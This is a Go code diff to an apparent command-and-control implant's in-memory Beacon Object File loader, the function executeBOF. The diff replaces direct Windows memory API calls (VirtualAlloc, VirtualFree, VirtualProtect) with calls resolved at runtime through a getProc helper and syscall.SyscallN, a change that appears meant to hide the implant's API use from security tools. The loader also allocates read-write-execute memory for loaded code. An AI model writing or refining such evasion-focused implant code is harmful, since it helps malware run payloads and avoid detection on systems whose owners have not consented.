@@ -139,10 +139,10 @@ func executeBOF(coffData []byte, args []byte, entryPoint string) string {
 			prot = PAGE_EXECUTE_READWRITE
 		}
 
-		addr, _, err := pVirtualAlloc.Call(0, uintptr(size), MEM_COMMIT|MEM_RESERVE, uintptr(prot))
+		addr, _, err := syscall.SyscallN(getProc(mKernel32, fVirtualAlloc), 0, uintptr(size), MEM_COMMIT|MEM_RESERVE, uintptr(prot))
 		if addr == 0 {
 			for j := 0; j < i; j++ {
-				pVirtualFree.Call(sectionAddrs[j], 0, MEM_RELEASE)
+				syscall.SyscallN(getProc(mKernel32, fVirtualFree), sectionAddrs[j], 0, MEM_RELEASE)
 			}
 			return fmt.Sprintf("Error: VirtualAlloc for section %d: %v", i, err)
 		}
@@ -158,7 +158,7 @@ func executeBOF(coffData []byte, args []byte, entryPoint string) string {
 	defer func() {
 		for _, addr := range sectionAddrs {
 			if addr != 0 {
-				pVirtualFree.Call(addr, 0, MEM_RELEASE)
+				syscall.SyscallN(getProc(mKernel32, fVirtualFree), addr, 0, MEM_RELEASE)
 			}
 		}
 	}()
@@ -312,7 +312,7 @@ func executeBOF(coffData []byte, args []byte, entryPoint string) string {
 	for i, addr := range sectionAddrs {
 		if addr != 0 && (sections[i].Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 || sections[i].Characteristics&IMAGE_SCN_CNT_CODE != 0) {
 			var oldProt uint32
-			pVirtualProtect.Call(addr, uintptr(sections[i].SizeOfRawData), PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
+			syscall.SyscallN(rpVirtualProtect, addr, uintptr(sections[i].SizeOfRawData), PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
 		}
 	}
 
